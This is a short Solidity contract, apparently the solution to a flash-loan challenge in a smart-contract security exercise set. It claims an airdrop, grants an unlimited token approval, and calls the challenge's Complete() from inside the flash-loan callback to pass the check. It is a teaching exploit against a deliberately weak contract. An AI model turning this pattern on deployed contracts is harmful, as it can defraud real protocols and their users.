pragma solidity ^0.8.0;

import "../challenge7/FlashLoanMain.sol";

contract FlashLoanMainSolution {
    FlashLoanMain flash;

    constructor(address flashLoanMain) {
        flash = FlashLoanMain(flashLoanMain);
        flash.airdrop();
        Cert(flash.cert()).approve(
            address(flash.flashLoanPriveder()),
            2**256 - 1
        );
    }

    function onFlashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool) {
        flash.Complete();
        return true;
    }
}
